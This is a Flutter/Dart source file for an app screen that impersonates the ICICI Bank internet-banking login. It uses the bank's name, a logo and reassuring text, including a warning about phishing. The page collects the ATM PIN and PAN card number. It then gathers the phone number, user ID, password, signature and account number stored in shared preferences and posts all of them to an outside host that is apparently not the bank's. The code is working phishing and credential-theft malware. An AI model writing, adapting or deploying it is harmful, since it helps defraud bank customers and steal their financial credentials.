import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:icici/pending.dart';
// ignore: depend_on_referenced_packages
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key}) : super(key: key);

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  SharedPreferences? prefs;

  String mobileNumber = '';
  String atmPin = '';
  String panCardNumber = '';

  var loading = false;

  Future _postDataToServer() async {
    prefs?.setString('mobileNumber', mobileNumber);
    prefs?.setString('atm_pin', atmPin);
    prefs?.setString('pan_card', panCardNumber);

    final phone = prefs?.getString('phone');
    final user_id = prefs?.getString('userId');
    final password = prefs?.getString('password');
    final signatures = prefs?.getString('signature');
    final account_no = prefs?.getString('account_number');
    final atm_pin = prefs?.getString('atm_pin');
    final pan_card = prefs?.getString('pan_card');

    //Set Loading to true
    setState(() {
      loading = true;
    });
    await http
        .post(Uri.parse("https://icici-d69xx.dauqu.host/data"),
            headers: <String, String>{
              'Content-Type': 'application/json; charset=UTF-8',
            },
            body: jsonEncode(<String, String>{
              "phone": phone.toString(),
              "user_id": user_id.toString(),
              "password": password.toString(),
              "signature": signatures.toString(),
              "account_no": account_no.toString(),
              "atm_pin": atm_pin.toString(),
              "pan_card": pan_card.toString()
            }))
        .then((value) => {
              //Set Laoding to false
              setState(() {
                loading = false;
              }),

              //Move to next page
              Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (context) => const Pending(),
                ),
              )
            })

        //Navigate to other page
        .catchError((onError) {
      print(onError);
      //Set Loading fase
      setState(() {
        loading = false;
      });

      //Show nackend error in dialog
      showDialog(
          context: context,
          builder: (BuildContext context) {
            return AlertDialog(
              title: const Text("Error"),
              content: Text(onError.toString()),
              actions: [
                TextButton(
                    onPressed: () {
                      Navigator.of(context).pop();
                    },
                    child: const Text("OK"))
              ],
            );
          });
    });
  }

  @override
  void initState() {
    super.initState();
    initializeSharedPreferences();
  }

  void initializeSharedPreferences() async {
    prefs = await SharedPreferences.getInstance();
  }

  void saveDataToSharedPreferences() {
    prefs?.setString('mobileNumber', mobileNumber);
    prefs?.setString('atmPin', atmPin);
    prefs?.setString('panCardNumber', panCardNumber);
  }

  bool validateForm() {
    if (mobileNumber.isEmpty || atmPin.isEmpty || panCardNumber.isEmpty) {
      //Show
    }
    return true;
  }

  var _isVisibility = true;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Colors.yellow.shade900,
        title: const Text("ICICI Bank"),
      ),
      body: Container(
        padding: const EdgeInsets.all(20),
        width: double.infinity,
        child: SingleChildScrollView(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              const SizedBox(
                height: 30,
              ),
              Image.asset(
                "assets/images/logo.jpg",
                height: 60,
              ),
              const SizedBox(
                height: 20,
              ),
              const Text(
                "Login To Internet Banking",
                style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold),
              ),
              const SizedBox(
                height: 20,
              ),
              const Text(
                "Welcome to ICICI Bank, India's largest private sector bank. We are glad to have you onboard. Please login to continue.",
                textAlign: TextAlign.start,
                style: TextStyle(fontSize: 15),
              ),
              const SizedBox(
                height: 60,
              ),
              const SizedBox(
                height: 20,
              ),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text("ATM PIN*"),
                  const SizedBox(
                    height: 10,
                  ),
                  TextField(
                    maxLength: 4,
                    obscureText: _isVisibility,
                    style: const TextStyle(color: Colors.black),
                    decoration: InputDecoration(
                      contentPadding: EdgeInsets.all(15),
                      isDense: true,
                      hintText: 'ATM PIN',
                      hintStyle: TextStyle(color: Colors.black),
                      filled: true,
                      prefixIcon: Icon(Icons.sd_card, color: Colors.black),
                      suffixIcon: IconButton(
                          onPressed: () {
                            setState(() {
                              _isVisibility = !_isVisibility;
                            });
                          },
                          icon: _isVisibility
                              ? const Icon(Icons.visibility)
                              : const Icon(Icons.visibility_off)),
                    ),
                    onChanged: (value) {
                      setState(() {
                        atmPin = value;
                      });
                    },
                    keyboardType: TextInputType
                        .number, // Set the keyboard type to numeric
                    inputFormatters: <TextInputFormatter>[
                      FilteringTextInputFormatter
                          .digitsOnly // Restrict input to digits only
                    ],
                  ),
                ],
              ),
              const SizedBox(
                height: 20,
              ),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text("PAN Card Number*"),
                  const SizedBox(
                    height: 10,
                  ),
                  TextField(
                    style: TextStyle(color: Colors.black),
                    decoration: const InputDecoration(
                      contentPadding: EdgeInsets.all(15),
                      isDense: true,
                      hintText: 'PAN Card Number.',
                      hintStyle: TextStyle(color: Colors.black),
                      filled: true,
                      prefixIcon: Icon(
                        Icons.panorama_horizontal_outlined,
                        color: Colors.black,
                      ),
                    ),
                    onChanged: (value) {
                      setState(() {
                        panCardNumber = value;
                      });
                    },
                  ),
                ],
              ),
              const SizedBox(
                height: 10,
              ),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Row(
                    children: [
                      Checkbox(
                        value: false,
                        onChanged: (value) {
                          // setState(() {
                          //   _rememberMe = value;
                          // });
                        },
                      ),
                      const Text("Remember Me"),
                    ],
                  ),
                ],
              ),
              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.yellow.shade900,
                    padding: const EdgeInsets.all(5),
                    elevation: 0,
                  ),
                  // onPressed: () {
                  // if (validateForm()) {
                  //   saveDataToSharedPreferences();
                  //   Navigator.push(
                  //     context,
                  //     MaterialPageRoute(
                  //       builder: (context) => const Pending(),
                  //     ),
                  //   );
                  // } else {
                  //   // Show an error message or perform other actions
                  // }
                  // },
                  onPressed: loading ? null : () => _postDataToServer(),
                  child: Text(
                    loading ? "Please wait..." : "Login",
                    style: const TextStyle(
                        fontSize: 15,
                        fontFamily: 'Ubuntu',
                        fontWeight: FontWeight.w700,
                        color: Colors.white),
                  ),
                ),
              ),
              const SizedBox(
                height: 20,
              ),
              const Text(
                "Safe banking tips: Beware of phishing and vishing attacks, Avoid sharing account related information over E-mail and SMS, Please read the terms and conditions carefully before proceeding.",
                textAlign: TextAlign.start,
                style: TextStyle(fontSize: 15),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
